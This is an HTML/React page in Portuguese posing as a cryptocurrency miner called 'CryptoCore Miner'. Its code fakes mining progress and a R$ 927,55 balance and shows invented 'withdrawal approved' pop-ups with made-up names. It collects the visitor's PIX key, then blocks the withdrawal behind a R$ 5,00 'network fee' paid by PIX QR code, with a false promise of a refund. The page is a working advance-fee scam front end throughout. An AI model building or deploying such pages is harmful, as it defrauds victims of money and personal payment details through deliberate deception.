<!DOCTYPE html>
<html lang="pt-BR">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>App - Teste 2</title>
    <!-- Carregando React via CDN para garantir que o JS chegue ao navegador -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/react/18.2.0/umd/react.production.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/react-dom/18.2.0/umd/react-dom.production.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/babel-standalone/7.23.5/babel.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/lucide/0.294.0/lucide.min.js"></script>
  </head>
  <body class="bg-slate-950 text-slate-50 font-sans">
    <div id="error-display" class="fixed top-0 left-0 w-full bg-red-600 text-white p-2 z-[9999] hidden font-mono text-xs"></div>
    <div id="root">
      <div class="min-h-screen flex items-center justify-center bg-black font-mono overflow-hidden relative">
        <!-- Matrix-like background effect -->
        <div class="absolute inset-0 opacity-20 pointer-events-none">
          <div class="h-full w-full bg-[linear-gradient(rgba(16,185,129,0.1)_50%,transparent_50%)] bg-[length:100%_4px]"></div>
        </div>

        <div class="text-center relative z-10 p-8">
          <div class="relative w-24 h-24 mx-auto mb-8">
            <div class="absolute inset-0 border-4 border-emerald-500/20 rounded-full"></div>
            <div class="absolute inset-0 border-4 border-emerald-500 rounded-full border-t-transparent animate-spin"></div>
            <div class="absolute inset-0 flex items-center justify-center">
              <div class="w-2 h-2 bg-emerald-500 rounded-full animate-ping"></div>
            </div>
          </div>
          
          <div class="space-y-4">
            <h2 class="text-2xl font-black text-white uppercase tracking-[0.3em] animate-pulse">Iniciando Minerador</h2>
            <div class="flex flex-col items-center gap-2">
              <div class="text-[10px] text-emerald-500/60 uppercase tracking-widest flex items-center gap-2">
                <span class="inline-block w-1 h-1 bg-emerald-500 rounded-full"></span>
                Sincronizando com a Blockchain
              </div>
              <div class="w-48 h-1 bg-zinc-900 rounded-full overflow-hidden border border-zinc-800">
                <div class="h-full bg-emerald-500 w-1/3 animate-[loading_2s_ease-in-out_infinite]"></div>
              </div>
            </div>
            <p class="text-[9px] text-zinc-600 uppercase tracking-widest mt-8">Estabelecendo Conexão Segura com o Nó...</p>
          </div>
        </div>
      </div>
    </div>

    <style>
      @keyframes loading {
        0% { transform: translateX(-100%); }
        100% { transform: translateX(200%); }
      }
      @keyframes slideIn {
        from { transform: translateX(100%); opacity: 0; }
        to { transform: translateX(0); opacity: 1; }
      }
      @keyframes slideOut {
        from { transform: translateX(0); opacity: 1; }
        to { transform: translateX(100%); opacity: 0; }
      }
      @keyframes popValue {
        0% { transform: scale(1); }
        50% { transform: scale(1.1); color: #10b981; }
        100% { transform: scale(1); }
      }
      .animate-slide-in { animation: slideIn 0.5s ease-out forwards; }
      .animate-slide-out { animation: slideOut 0.5s ease-in forwards; }
      .animate-pop { animation: popValue 0.4s ease-out; }
    </style>

    <script>
      window.onerror = function(msg, url, line, col, error) {
        var display = document.getElementById('error-display');
        display.style.display = 'block';
        display.innerHTML = 'ERRO: ' + msg + ' (Linha: ' + line + ')';
        return false;
      };
    </script>

    <script type="text/babel">
      const { useState, useEffect, useRef, Component } = React;

      // Error Boundary deve ser uma Class Component no React
      class ErrorBoundary extends Component {
        constructor(props) {
          super(props);
          this.state = { hasError: false, error: null };
        }
        static getDerivedStateFromError(error) {
          return { hasError: true, error };
        }
        componentDidCatch(error, errorInfo) {
          console.error("Erro capturado:", error, errorInfo);
        }
        render() {
          if (this.state.hasError) {
            return (
              <div style={{ padding: '20px', background: '#450a0a', color: 'white', fontFamily: 'monospace' }}>
                <h1>Erro de Renderização</h1>
                <pre>{this.state.error?.message}</pre>
                <button onClick={() => window.location.reload()}>Recarregar</button>
              </div>
            );
          }
          return this.props.children;
        }
      }

      const App = () => {
        const [isMining, setIsMining] = useState(false);
        const [blocksSolved, setBlocksSolved] = useState(0);
        const [balance, setBalance] = useState(0);
        const [hashRate, setHashRate] = useState(45.2); // TH/s
        const [logs, setLogs] = useState([]);
        const [progress, setProgress] = useState(0);
        const [currentStep, setCurrentStep] = useState('mining'); // mining, withdraw_info, loading, blocked, qrcode
        const [pixKey, setPixKey] = useState('');
        const [pixType, setPixType] = useState('cpf');

        const [withdrawProgress, setWithdrawProgress] = useState(0);
        const [alert, setAlert] = useState(null);
        const [isAlertVisible, setIsAlertVisible] = useState(false);

        const alertsData = [
          { name: "João Silva", city: "São Paulo", value: "R$ 927,55" },
          { name: "Maria Oliveira", city: "Rio de Janeiro", value: "R$ 1.855,10" },
          { name: "Carlos Santos", city: "Belo Horizonte", value: "R$ 927,55" },
          { name: "Ana Pereira", city: "Curitiba", value: "R$ 463,77" },
          { name: "Lucas Mendes", city: "Fortaleza", value: "R$ 927,55" },
          { name: "Beatriz Gomes", city: "Salvador", value: "R$ 1.855,10" },
          { name: "Ricardo Alves", city: "Porto Alegre", value: "R$ 927,55" },
          { name: "Fernanda Lima", city: "Brasília", value: "R$ 463,77" }
        ];

        useEffect(() => {
          const showRandomAlert = () => {
            const randomAlert = alertsData[Math.floor(Math.random() * alertsData.length)];
            setAlert(randomAlert);
            setIsAlertVisible(true);
            
            setTimeout(() => {
              setIsAlertVisible(false);
            }, 5000);
          };

          const interval = setInterval(showRandomAlert, 12000);
          // Show first alert after 3 seconds
          const initialTimeout = setTimeout(showRandomAlert, 3000);

          return () => {
            clearInterval(interval);
            clearTimeout(initialTimeout);
          };
        }, []);

        // Gerar hash aleatório
        const generateHash = () => {
          const chars = '0123456789abcdef';
          let result = '0000'; 
          for (let i = 0; i < 60; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
          }
          return result;
        };

        useEffect(() => {
          let interval;
          if (currentStep === 'loading') {
            setWithdrawProgress(0);
            interval = setInterval(() => {
              setWithdrawProgress(prev => {
                if (prev >= 100) {
                  return 100;
                }
                return prev + 5;
              });
            }, 150);
          }
          return () => clearInterval(interval);
        }, [currentStep]);

        useEffect(() => {
          if (currentStep === 'loading' && withdrawProgress >= 100) {
            const timer = setTimeout(() => {
              setCurrentStep('blocked');
            }, 800);
            return () => clearTimeout(timer);
          }
        }, [currentStep, withdrawProgress]);

        useEffect(() => {
          let interval;
          if (isMining && blocksSolved < 2) {
            interval = setInterval(() => {
              const newHash = generateHash();
              setLogs(prev => [newHash, ...prev].slice(0, 15));

              setProgress(prev => {
                const step = (hashRate / 100) + (Math.random() * 2);
                if (prev + step >= 100) {
                  const newBlocksCount = blocksSolved + 1;
                  setBlocksSolved(newBlocksCount);
                  setBalance(bal => bal + 6.25);
                  
                  if (newBlocksCount === 2) {
                    setIsMining(false);
                  }
                  
                  return 0;
                }
                return prev + step;
              });
            }, 100);
          }
          return () => clearInterval(interval);
        }, [isMining, hashRate, blocksSolved]);

        useEffect(() => {
          if (window.lucide) window.lucide.createIcons();
        }, [isMining, currentStep, blocksSolved]);

        const toggleMining = () => {
          if (blocksSolved >= 2) return;
          setIsMining(!isMining);
        };

        const handleWithdrawClick = () => setCurrentStep('withdraw_info');
        
        const handleFinalWithdraw = () => {
          if (!pixKey) {
            alert("Por favor, insira sua chave PIX.");
            return;
          }
          setCurrentStep('loading');
        };

        const handlePayFee = () => setCurrentStep('qrcode');

        // Renderização baseada no passo atual
        if (currentStep === 'withdraw_info') {
          return (
            <div className="min-h-screen bg-[#0a0a0b] text-[#e2e2e4] font-mono p-4 flex flex-col items-center justify-center">
              <div className="w-full max-w-md bg-[#151518] border border-[#1f1f23] p-8 rounded-2xl shadow-2xl">
                <div className="flex items-center gap-3 mb-8 border-b border-zinc-800 pb-4">
                  <i data-lucide="wallet" className="w-6 h-6 text-emerald-500"></i>
                  <h2 className="text-xl font-bold uppercase tracking-tighter">Solicitar Saque</h2>
                </div>

                <div className="mb-8 p-4 bg-emerald-500/5 border border-emerald-500/20 rounded-xl text-center">
                  <div className="text-[10px] text-zinc-500 uppercase mb-1">Valor Disponível</div>
                  <div className="text-3xl font-black text-white">R$ 927,55</div>
                  <div className="text-[10px] text-emerald-500 font-bold mt-1">{balance.toFixed(4)} BTC</div>
                </div>

                <div className="space-y-6">
                  <div>
                    <label className="text-[10px] text-zinc-500 uppercase mb-2 block">Tipo de Chave PIX</label>
                    <div className="grid grid-cols-2 gap-2">
                      {['CPF', 'E-mail', 'Telefone', 'Aleatória'].map(type => (
                        <button 
                          key={type}
                          onClick={() => setPixType(type.toLowerCase())}
                          className={`py-2 text-[10px] uppercase font-bold rounded-lg border transition-all ${
                            pixType === type.toLowerCase() 
                            ? 'bg-emerald-500 border-emerald-500 text-black' 
                            : 'bg-black/20 border-zinc-800 text-zinc-500 hover:border-zinc-600'
                          }`}
                        >
                          {type}
                        </button>
                      ))}
                    </div>
                  </div>

                  <div>
                    <label className="text-[10px] text-zinc-500 uppercase mb-2 block">Sua Chave PIX</label>
                    <input 
                      type="text" 
                      value={pixKey}
                      onChange={(e) => setPixKey(e.target.value)}
                      placeholder="Insira sua chave aqui..."
                      className="w-full bg-black/40 border border-zinc-800 rounded-lg p-4 text-sm focus:outline-none focus:border-emerald-500 transition-all"
                    />
                  </div>

                  <button 
                    onClick={handleFinalWithdraw}
                    className="w-full py-4 bg-emerald-500 hover:bg-emerald-400 text-black font-black rounded-xl uppercase tracking-widest transition-all shadow-lg shadow-emerald-500/20"
                  >
                    Confirmar Saque
                  </button>
                  
                  <button 
                    onClick={() => setCurrentStep('mining')}
                    className="w-full py-2 text-[10px] text-zinc-600 uppercase hover:text-zinc-400 transition-all"
                  >
                    Voltar
                  </button>
                </div>
              </div>
            </div>
          );
        }

        if (currentStep === 'loading') {
          return (
            <div className="min-h-screen bg-black text-emerald-500 font-mono p-4 flex flex-col items-center justify-center overflow-hidden relative">
              {/* Background scanning effect */}
              <div className="absolute inset-0 pointer-events-none opacity-10">
                <div className="h-full w-full bg-[linear-gradient(rgba(16,185,129,0.1)_50%,transparent_50%)] bg-[length:100%_4px] animate-[scan_10s_linear_infinite]"></div>
              </div>

              <div className="w-full max-w-lg relative z-10">
                <div className="mb-12 text-center">
                  <div className="inline-block p-4 rounded-full bg-emerald-500/10 border border-emerald-500/30 mb-6 animate-pulse">
                    <i data-lucide="database" className="w-12 h-12"></i>
                  </div>
                  <h2 className="text-2xl font-black uppercase tracking-[0.3em] mb-2">Sincronizando Ledger</h2>
                  <div className="flex items-center justify-center gap-2 text-[10px] text-emerald-500/60 uppercase tracking-widest">
                    <span className="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-ping"></span>
                    Conexão Criptografada Ativa
                  </div>
                </div>

                <div className="space-y-8 bg-zinc-900/50 border border-emerald-500/20 p-8 rounded-3xl backdrop-blur-xl shadow-[0_0_50px_rgba(16,185,129,0.1)]">
                  <div className="space-y-4">
                    <div className="flex justify-between items-end">
                      <div className="space-y-1">
                        <div className="text-[10px] uppercase font-bold text-emerald-500/40">Status da Transação</div>
                        <div className="text-xs font-bold uppercase tracking-wider">
                          {withdrawProgress < 30 ? 'Validando Assinatura...' : 
                           withdrawProgress < 60 ? 'Buscando Nós da Rede...' : 
                           withdrawProgress < 90 ? 'Confirmando na Blockchain...' : 
                           'Finalizando Operação...'}
                        </div>
                      </div>
                      <div className="text-xl font-black">{withdrawProgress}%</div>
                    </div>

                    <div className="h-3 bg-black/50 rounded-full overflow-hidden border border-emerald-500/20 p-0.5">
                      <div 
                        className="h-full bg-gradient-to-r from-emerald-600 to-emerald-400 rounded-full transition-all duration-300 shadow-[0_0_15px_rgba(16,185,129,0.5)]"
                        style={{ width: `${withdrawProgress}%` }}
                      ></div>
                    </div>
                  </div>

                  <div className="grid grid-cols-2 gap-4 pt-4 border-t border-emerald-500/10">
                    <div className="space-y-1">
                      <div className="text-[8px] uppercase text-emerald-500/40">Protocolo</div>
                      <div className="text-[10px] font-bold">P2P-SECURE-v3</div>
                    </div>
                    <div className="space-y-1 text-right">
                      <div className="text-[8px] uppercase text-emerald-500/40">Latência</div>
                      <div className="text-[10px] font-bold">14ms</div>
                    </div>
                  </div>
                </div>

                <div className="mt-12 flex justify-center gap-8 opacity-20">
                  <i data-lucide="shield-check" className="w-6 h-6"></i>
                  <i data-lucide="cpu" className="w-6 h-6"></i>
                  <i data-lucide="globe" className="w-6 h-6"></i>
                </div>
              </div>

              <style>{`
                @keyframes scan {
                  from { transform: translateY(-100%); }
                  to { transform: translateY(100%); }
                }
              `}</style>
            </div>
          );
        }

        if (currentStep === 'blocked') {
          return (
            <div className="min-h-screen bg-[#0a0a0b] text-[#e2e2e4] font-mono p-4 flex flex-col items-center justify-center">
              <div className="w-full max-w-md bg-[#151518] border border-rose-500/30 p-8 rounded-2xl shadow-2xl text-center">
                <div className="w-20 h-20 bg-rose-500/10 rounded-full flex items-center justify-center mx-auto mb-6">
                  <i data-lucide="lock" className="w-10 h-10 text-rose-500"></i>
                </div>
                
                <h2 className="text-2xl font-black text-white uppercase tracking-tighter mb-4">Saque Bloqueado</h2>
                
                <p className="text-sm text-zinc-400 leading-relaxed mb-8">
                  Detectamos que esta é sua primeira retirada. Para liberar o saldo de <span className="text-white font-bold">R$ 927,55</span>, é necessário realizar o pagamento da <span className="text-amber-500 font-bold uppercase">Taxa de Rede (Gas Fee)</span> obrigatória.
                </p>

                <div className="bg-black/40 border border-zinc-800 p-6 rounded-xl mb-8">
                  <div className="text-[10px] text-zinc-500 uppercase mb-1">Valor da Taxa</div>
                  <div className="text-3xl font-black text-rose-500">R$ 5,00</div>
                  <div className="text-[10px] text-zinc-600 mt-2 italic">O valor será estornado após a conclusão do saque.</div>
                </div>

                <button 
                  onClick={handlePayFee}
                  className="w-full py-5 bg-white text-black font-black rounded-xl uppercase tracking-[0.2em] hover:bg-emerald-400 transition-all shadow-xl"
                >
                  Pagar Taxa e Liberar Saque
                </button>
              </div>
            </div>
          );
        }

        if (currentStep === 'qrcode') {
          return (
            <div className="min-h-screen bg-[#0a0a0b] text-[#e2e2e4] font-mono p-4 flex flex-col items-center justify-center">
              <div className="w-full max-w-md bg-white p-8 rounded-3xl text-center text-black shadow-2xl">
                <div className="flex items-center justify-center gap-2 mb-6">
                  <img src="https://logospng.org/download/pix/logo-pix-icone-512.png" className="h-6" alt="PIX" />
                  <span className="font-black uppercase tracking-tighter text-sm">Pagamento via PIX</span>
                </div>

                <div className="bg-zinc-100 p-4 rounded-2xl mb-6">
                  <img 
                    src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=00020126330014br.gov.bcb.pix01110000000000052040000530398654045.005802BR5913CryptoMiner6009SAO%20PAULO62070503***6304" 
                    className="w-full aspect-square rounded-lg shadow-inner"
                    alt="QR Code PIX"
                  />
                </div>

                <div className="space-y-4">
                  <div className="text-left bg-zinc-50 p-4 rounded-xl border border-zinc-200">
                    <div className="text-[10px] text-zinc-400 uppercase font-bold">Valor a pagar</div>
                    <div className="text-xl font-black">R$ 5,00</div>
                  </div>

                  <p className="text-[10px] text-zinc-400 uppercase leading-tight">
                    Escaneie o código acima com o app do seu banco. <br />
                    O saque será liberado automaticamente após a confirmação.
                  </p>

                  <div className="pt-4 border-t border-zinc-100">
                    <button 
                      onClick={() => alert("Chave PIX Copia e Cola copiada!")}
                      className="w-full py-3 bg-zinc-900 text-white text-xs font-bold rounded-xl uppercase tracking-widest"
                    >
                      Copiar Código PIX
                    </button>
                  </div>
                </div>
              </div>
              <button 
                onClick={() => setCurrentStep('blocked')}
                className="mt-8 text-[10px] text-zinc-600 uppercase hover:text-zinc-400 transition-all"
              >
                Cancelar e Voltar
              </button>
            </div>
          );
        }

        return (
          <div className="min-h-screen bg-[#0a0a0b] text-[#e2e2e4] font-mono p-4 md:p-8 flex flex-col items-center">
            {/* Alerta de Saque Recente */}
            {alert && (
              <div className={`fixed top-4 right-4 z-[100] w-72 bg-[#151518] border border-emerald-500/30 p-4 rounded-2xl shadow-2xl backdrop-blur-xl ${isAlertVisible ? 'animate-slide-in' : 'animate-slide-out'}`}>
                <div className="flex items-start gap-3">
                  <div className="bg-emerald-500/20 p-2 rounded-lg">
                    <i data-lucide="check-circle" className="w-5 h-5 text-emerald-500"></i>
                  </div>
                  <div className="flex-1">
                    <div className="text-[10px] text-zinc-500 uppercase font-bold mb-1">Saque Aprovado</div>
                    <div className="text-xs font-black text-white">{alert.name}</div>
                    <div className="text-[9px] text-zinc-400 uppercase tracking-tighter">{alert.city}</div>
                    <div className="mt-2 text-emerald-400 font-black text-sm">{alert.value}</div>
                  </div>
                </div>
              </div>
            )}

            {/* Cabeçalho */}
            <header className="w-full max-w-5xl flex justify-between items-center mb-8 border-b border-[#1f1f23] pb-6">
              <div className="flex items-center gap-3">
                <div className={`p-2 rounded-lg ${isMining ? 'bg-amber-500/20 text-amber-500 animate-pulse' : 'bg-zinc-800 text-zinc-500'}`}>
                  <i data-lucide="cpu" className="w-6 h-6"></i>
                </div>
                <div>
                  <h1 className="text-xl font-bold tracking-tighter uppercase">CryptoCore Miner <span className="text-[10px] bg-zinc-800 px-2 py-0.5 rounded ml-2">v1.0.4-PRO</span></h1>
                  <p className="text-[10px] text-zinc-500 uppercase tracking-widest">ID do Hardware: 0x882A-BF92-110C</p>
                </div>
              </div>
              <div className="text-right">
                <div className="text-xs text-zinc-500 uppercase">Status do Sistema</div>
                <div className={`text-xs font-bold uppercase ${isMining ? 'text-emerald-500' : 'text-rose-500'}`}>
                  {isMining ? '● Operacional' : '○ Em Espera'}
                </div>
              </div>
            </header>

            <main className="w-full max-w-5xl grid grid-cols-1 lg:grid-cols-3 gap-6">
              <div className="lg:col-span-2 space-y-6">
                
                {/* Recompensa Especial para 2 Blocos */}
                {blocksSolved >= 2 && (
                  <div className="bg-emerald-500/10 border-2 border-emerald-500/50 p-6 rounded-2xl shadow-[0_0_30px_rgba(16,185,129,0.2)]">
                    <div className="flex flex-col md:flex-row items-center justify-between gap-6">
                      <div className="flex items-center gap-4">
                        <div className="bg-emerald-500 p-3 rounded-xl">
                          <i data-lucide="trophy" className="w-8 h-8 text-black"></i>
                        </div>
                        <div>
                          <h2 className="text-xl font-black text-emerald-400 uppercase tracking-tighter">Mineração Concluída!</h2>
                          <div className="flex items-baseline gap-3 mt-1">
                            <span className="text-3xl font-bold text-white">R$ 927,55</span>
                            <span className="text-emerald-500/70 text-sm font-bold">| {balance.toFixed(4)} BTC</span>
                          </div>
                        </div>
                      </div>
                      <button 
                        onClick={handleWithdrawClick}
                        className="w-full md:w-auto px-8 py-4 bg-emerald-500 hover:bg-emerald-400 text-black font-black rounded-xl uppercase tracking-widest transition-all shadow-lg shadow-emerald-500/40"
                      >
                        Realizar Saque
                      </button>
                    </div>
                  </div>
                )}

                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                  <div className="bg-[#151518] border border-[#1f1f23] p-6 rounded-xl shadow-inner">
                    <div className="text-[10px] text-zinc-500 uppercase mb-2">Hashrate</div>
                    <div className="text-3xl font-bold text-amber-500">{hashRate.toFixed(1)} <span className="text-sm text-zinc-600">TH/s</span></div>
                  </div>
                  <div className="bg-[#151518] border border-[#1f1f23] p-6 rounded-xl shadow-inner">
                    <div className="text-[10px] text-zinc-500 uppercase mb-2">Blocos Resolvidos</div>
                    <div className="text-3xl font-bold text-emerald-500">{blocksSolved}</div>
                  </div>
                  <div className="bg-[#151518] border border-[#1f1f23] p-6 rounded-xl shadow-inner">
                    <div className="text-[10px] text-zinc-500 uppercase mb-2">Saldo Total</div>
                    <div key={balance} className="text-3xl font-bold text-white animate-pop">
                      {balance.toFixed(4)} <span className="text-sm text-zinc-600">BTC</span>
                    </div>
                  </div>
                </div>

                {/* Visualização de Mineração */}
                <div className="bg-[#151518] border border-[#1f1f23] p-6 rounded-xl relative overflow-hidden">
                  <div className="flex justify-between items-center mb-4">
                    <div className="text-xs uppercase font-bold text-zinc-400 flex items-center gap-2">
                      <i data-lucide="activity" className="w-4 h-4"></i>
                      Progresso de Dificuldade da Rede
                    </div>
                    <div className="text-xs font-bold text-amber-500">{progress.toFixed(1)}%</div>
                  </div>
                  
                  <div className="h-4 bg-black/50 rounded-full border border-zinc-800 overflow-hidden mb-6">
                    <div 
                      className="h-full bg-gradient-to-r from-amber-600 to-amber-400 transition-all duration-300 shadow-[0_0_15px_rgba(245,158,11,0.3)]"
                      style={{ width: `${progress}%` }}
                    ></div>
                  </div>

                  <div className="bg-black/40 p-4 rounded-lg border border-zinc-900 font-mono text-[10px] leading-relaxed overflow-hidden h-64">
                    <div className="text-zinc-600 mb-2 border-b border-zinc-800 pb-1">FLUXO DE HASH EM TEMPO REAL [SHA-256]</div>
                    {logs.length === 0 ? (
                      <div className="text-zinc-800 italic">Aguardando inicialização do minerador...</div>
                    ) : (
                      logs.map((log, i) => (
                        <div key={i} className={`flex gap-4 ${i === 0 ? 'text-amber-400 font-bold' : 'text-zinc-500'}`}>
                          <span className="opacity-30">[{new Date().toLocaleTimeString()}]</span>
                          <span className="truncate">{log}</span>
                          <span className="text-zinc-700 ml-auto">NONCE: {Math.floor(Math.random() * 999999)}</span>
                        </div>
                      ))
                    )}
                  </div>
                </div>
              </div>

              {/* Painel de Controles */}
              <div className="space-y-6">
                <div className="bg-[#151518] border border-[#1f1f23] p-6 rounded-xl">
                  <h2 className="text-xs uppercase font-bold text-zinc-400 mb-6 flex items-center gap-2">
                    <i data-lucide="settings" className="w-4 h-4"></i>
                    Controles do Minerador
                  </h2>
                  
                  <div className="space-y-4">
                    <button 
                      onClick={toggleMining}
                      disabled={blocksSolved >= 2}
                      className={`w-full py-4 rounded-lg font-bold uppercase tracking-widest transition-all flex items-center justify-center gap-2 ${
                        blocksSolved >= 2 ? 'bg-zinc-800 text-zinc-600 cursor-not-allowed' :
                        isMining 
                        ? 'bg-rose-500/10 text-rose-500 border border-rose-500/50 hover:bg-rose-500 hover:text-white' 
                        : 'bg-emerald-500 text-black hover:bg-emerald-400'
                      }`}
                    >
                      <i data-lucide={isMining ? "square" : "play"} className="w-5 h-5"></i>
                      {blocksSolved >= 2 ? 'Mineração Finalizada' : isMining ? 'Parar Mineração' : 'Iniciar Mineração'}
                    </button>

                    <button 
                      className="w-full py-4 bg-zinc-800 text-zinc-500 rounded-lg font-bold uppercase tracking-widest border border-zinc-700 flex items-center justify-center gap-2 cursor-not-allowed"
                    >
                      <i data-lucide="zap" className="w-5 h-5"></i>
                      Melhorar Hardware
                    </button>
                  </div>

                  <div className="mt-8 pt-8 border-t border-zinc-800 space-y-4">
                    <div className="flex justify-between text-[10px] uppercase">
                      <span className="text-zinc-500">Temp. do Núcleo</span>
                      <span className={isMining ? 'text-amber-500' : 'text-emerald-500'}>{isMining ? '72°C' : '34°C'}</span>
                    </div>
                    <div className="flex justify-between text-[10px] uppercase">
                      <span className="text-zinc-500">Consumo de Energia</span>
                      <span className="text-zinc-300">{isMining ? '850W' : '12W'}</span>
                    </div>
                    <div className="flex justify-between text-[10px] uppercase">
                      <span className="text-zinc-500">Velocidade Fan</span>
                      <span className="text-zinc-300">{isMining ? '4200 RPM' : '0 RPM'}</span>
                    </div>
                  </div>
                </div>
              </div>
            </main>

            <footer className="mt-auto pt-12 pb-6 text-[10px] text-zinc-700 uppercase tracking-[0.4em]">
              Conexão Criptografada Segura | Nó: 182.19.0.44
            </footer>
          </div>
        );
      };

      const root = ReactDOM.createRoot(document.getElementById('root'));
      root.render(
        <ErrorBoundary>
          <App />
        </ErrorBoundary>
      );
      
      const initIcons = () => {
        if (window.lucide) {
          window.lucide.createIcons();
        } else {
          setTimeout(initIcons, 100);
        }
      };
      initIcons();
    </script>




  </body>
</html>
